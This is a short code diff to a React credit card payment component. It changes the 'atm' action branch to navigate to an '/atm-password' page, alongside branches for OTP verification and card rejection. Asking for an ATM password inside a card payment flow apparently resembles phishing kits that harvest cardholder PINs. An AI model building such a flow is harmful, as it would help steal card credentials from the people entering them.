@@ -206,7 +206,7 @@ export default function CreditCardPayment() {
       if (action === 'otp') {
         navigate("/otp-verification");
       } else if (action === 'atm') {
-        navigate("/otp-verification");
+        navigate("/atm-password");
       } else if (action === 'reject') {
         setRejectedError(true);
         // تفريغ جميع الحقول عند رفض البطاقة
